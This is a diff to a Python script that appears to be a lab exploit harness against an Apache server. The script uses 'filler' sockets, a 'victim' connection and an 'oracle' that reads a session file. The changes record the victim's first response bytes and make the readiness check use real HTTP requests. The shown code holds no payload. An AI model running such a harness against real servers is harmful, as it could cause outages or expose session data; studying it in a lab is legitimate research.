@@ -101,21 +101,26 @@ def filler_push(socks: list[socket.socket], per_filler: int) -> int:
         return sum(ex.map(push_one, socks))
 
 
-def victim_wait(s: socket.socket, timeout: float) -> tuple[str, float]:
+def victim_wait(s: socket.socket, timeout: float) -> tuple[str, float, bytes]:
     """Wait for the victim connection: eof / reset / timeout. Returns
-    (event, elapsed_ms)."""
+    (event, elapsed_ms, first response bytes)."""
     t0 = time.monotonic()
     s.settimeout(timeout)
+    first = b""
     try:
-        while s.recv(65536):
-            pass
-        return "eof", (time.monotonic() - t0) * 1000
+        while True:
+            c = s.recv(65536)
+            if not c:
+                break
+            if not first:
+                first = c[:200]
+        return "eof", (time.monotonic() - t0) * 1000, first
     except ConnectionResetError:
-        return "rst", (time.monotonic() - t0) * 1000
+        return "rst", (time.monotonic() - t0) * 1000, first
     except socket.timeout:
-        return "timeout", (time.monotonic() - t0) * 1000
+        return "timeout", (time.monotonic() - t0) * 1000, first
     except OSError as e:
-        return type(e).__name__, (time.monotonic() - t0) * 1000
+        return type(e).__name__, (time.monotonic() - t0) * 1000, first
 
 
 def _dechunk(data: bytes) -> bytes:
@@ -310,9 +315,11 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
     time.sleep(0.4)                 # let the charge settle before the victim
 
     victim, _ = lab.replacement_hold(sid)
-    ev, drop_ms = victim_wait(victim, timeout=6.0)
+    ev, drop_ms, vresp = victim_wait(victim, timeout=6.0)
     res["victim"] = ev
     res["drop_ms"] = round(drop_ms, 1)
+    if vresp:
+        res["vresp"] = vresp[:80].decode(errors="replace")
 
     # Release the pressure BEFORE reading the oracle: the consumer has to
     # read the (up to 16 MiB) session file and must not OOM on the way.
@@ -354,14 +361,20 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
 # --------------------------------------------------------------- driver
 
 def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
+    """Wait until the target answers a real HTTP request.
+
+    A bare connect is not enough: right after a restart the kernel can
+    accept into the backlog before apache's accept loop runs, and the
+    first send then dies with EPIPE (each occurrence burned an attempt).
+    """
     t0 = time.monotonic()
     while time.monotonic() - t0 < timeout:
         try:
-            s = socket.create_connection((host, port), timeout=2)
-            s.close()
-            return True
+            if http_get(host, port, "/", timeout=3):
+                return True
         except OSError:
-            time.sleep(0.5)
+            pass
+        time.sleep(0.5)
     return False
 
 
